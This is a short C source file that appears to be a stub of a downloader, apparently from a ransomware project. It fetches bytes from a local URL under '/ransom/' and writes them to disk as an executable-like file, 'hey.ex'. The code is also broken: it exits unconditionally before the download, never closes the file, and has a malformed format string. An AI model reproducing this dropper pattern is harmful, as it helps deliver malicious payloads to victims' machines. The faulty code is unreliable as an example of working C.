#include "clonelib.h"
#include "thirdparty/b64.h"
#include <stdio.h>
#include <stdlib.h>


#define failure(x) fprintf(stderr,"Failure: %s\n", x);exit(1)
#define error(x) fprintf(stderr, "%Error: %s\n", x)
int main(){
	failure("Oh no!");
	char* b;
	unsigned int s;
	
	s=getRemoteBytes(&b,"http://127.0.0.1/ransom/x_hello");
	FILE* exe=fopen("hey.ex","wb");
	for(unsigned int i=0;i<s;i++){fprintf(exe,"%c",b[i]);}
	
	return 0;
	
}
 

 
